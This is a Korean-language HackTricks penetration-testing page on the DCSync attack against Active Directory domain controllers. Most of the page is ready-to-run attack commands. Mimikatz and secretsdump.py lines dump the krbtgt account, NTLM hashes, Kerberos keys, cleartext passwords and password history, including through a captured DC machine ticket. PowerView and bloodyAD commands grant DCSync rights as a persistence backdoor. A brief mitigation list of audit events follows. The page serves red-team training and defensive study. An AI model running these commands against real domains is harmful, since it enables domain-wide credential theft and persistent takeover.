# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 권한은 도메인 자체에 대해 다음 권한을 보유하고 있음을 의미합니다: **DS-Replication-Get-Changes**, **Replicating Directory Changes All**, **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**DCSync에 대한 중요 참고 사항:**

- **DCSync attack은 Domain Controller의 동작을 시뮬레이션하고, Directory Replication Service Remote Protocol (MS-DRSR)을 사용하여 다른 Domain Controller에 정보 복제를 요청합니다.** MS-DRSR은 유효하고 필요한 Active Directory 기능이므로 중지하거나 비활성화할 수 없습니다.
- 기본적으로 **Domain Admins, Enterprise Admins, Administrators, Domain Controllers** 그룹만 필요한 권한을 보유합니다.
- 실제로 **full DCSync**에는 도메인 naming context에 대해 **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** 권한이 필요합니다. `DS-Replication-Get-Changes-In-Filtered-Set`은 일반적으로 이들과 함께 위임되지만, 단독으로는 full krbtgt dump보다는 **confidential / RODC-filtered attributes**(예: 레거시 LAPS 스타일 secrets)를 동기화하는 데 더 관련이 있습니다.<sup>[[2]](#references)</sup>
- 계정 비밀번호가 reversible encryption을 사용하여 저장된 경우, Mimikatz에서 비밀번호를 평문으로 반환하는 옵션을 사용할 수 있습니다.

### 열거

`powerview`를 사용하여 이러한 권한을 보유한 사용자를 확인합니다:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
DCSync 권한이 있는 **non-default principal**에 집중하려면, 기본 제공 replication-capable 그룹을 필터링하고 예상치 못한 trustee만 검토하세요:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### 로컬에서 Exploit
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 원격으로 Exploit
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
실용적인 범위 지정 예시:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### 캡처한 DC machine TGT (ccache)를 사용한 DCSync

unconstrained-delegation export-mode 시나리오에서는 Domain Controller machine TGT (예: `krbtgt@DOMAIN`에 대한 `DC1$@DOMAIN`)를 캡처할 수 있습니다. 그런 다음 해당 ccache를 사용해 비밀번호 없이 DC로 인증하고 DCSync를 수행할 수 있습니다.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operational notes:

- **Impacket's Kerberos path는** DRSUAPI 호출 전에 먼저 SMB를 거칩니다. 환경에서 **SPN target name validation**을 적용하는 경우, 전체 dump가 `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`와 함께 실패할 수 있습니다.
- 이 경우 먼저 대상 DC에 대해 **`cifs/<dc>`** service ticket을 요청하거나, 즉시 필요한 계정에 대해 **`-just-dc-user`**로 대체하세요.
- 더 낮은 replication 권한만 있는 경우에도 LDAP/DirSync-style syncing을 통해 **confidential** 또는 **RODC-filtered** attributes(예: 기존 `ms-Mcs-AdmPwd`)가 노출될 수 있으며, 전체 krbtgt replication은 필요하지 않습니다.<sup>[[2]](#references)</sup>

`-just-dc`는 3개의 파일을 생성합니다:

- **NTLM hashes**가 포함된 파일
- **Kerberos keys**가 포함된 파일
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)이 활성화된 계정에 대해 NTDS에서 가져온 cleartext passwords가 포함된 파일. reversible encryption이 적용된 사용자는 다음 명령으로 확인할 수 있습니다.

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

domain admin인 경우 `powerview`를 사용하여 모든 사용자에게 이 권한을 부여할 수 있습니다:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux 운영자는 `bloodyAD`를 사용해 동일한 작업을 수행할 수 있습니다:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
그런 다음, 다음 명령의 출력에서 3개의 권한이 사용자에게 올바르게 할당되었는지 **확인**할 수 있습니다(“ObjectType” 필드에서 권한 이름을 확인할 수 있어야 합니다):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 완화

- Security Event ID 4662 (Audit Policy for object must be enabled) - 객체에서 작업이 수행됨<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) - 디렉터리 서비스 객체가 수정됨
- Security Event ID 4670 (Audit Policy for object must be enabled) - 객체에 대한 권한이 변경됨
- AD ACL Scanner - ACL의 보고서를 생성하고 비교합니다. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 참고 자료

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-Changes 및 Get-Changes-In-Filtered-Set 활용](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Domain Controller에서 Password Hash 덤프](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate - SYSVOL creds -> Targeted Kerberoast -> Unconstrained Delegation -> DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
